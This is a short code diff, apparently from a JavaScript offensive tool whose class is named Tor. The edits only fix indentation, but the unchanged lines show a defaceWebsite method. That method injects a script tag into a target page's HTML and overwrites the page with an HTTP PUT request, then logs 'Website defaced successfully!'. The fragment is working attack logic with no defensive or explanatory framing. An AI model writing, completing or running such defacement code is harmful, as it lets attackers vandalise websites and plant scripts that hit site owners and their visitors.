@@ -457,7 +457,7 @@ class Tor {
     }
 
     async defaceWebsite(url) {
-       if (!this.defaceScript) {
+        if (!this.defaceScript) {
             const errorMessage = 'Deface script not set. Use setDefaceScript() first.';
             this.log(errorMessage, 'error');
             return;
@@ -482,7 +482,7 @@ class Tor {
                 targetContent += scriptTag;
             }
 
-             const putOptions = {
+            const putOptions = {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'text/html',
@@ -495,7 +495,7 @@ class Tor {
 
             const putResponse = await fetchMethod(url, putOptions);
 
-             if (putResponse.ok) {
+            if (putResponse.ok) {
                 const successMessage = 'Website defaced successfully!';
                 this.log(successMessage, 'success');
             } else {
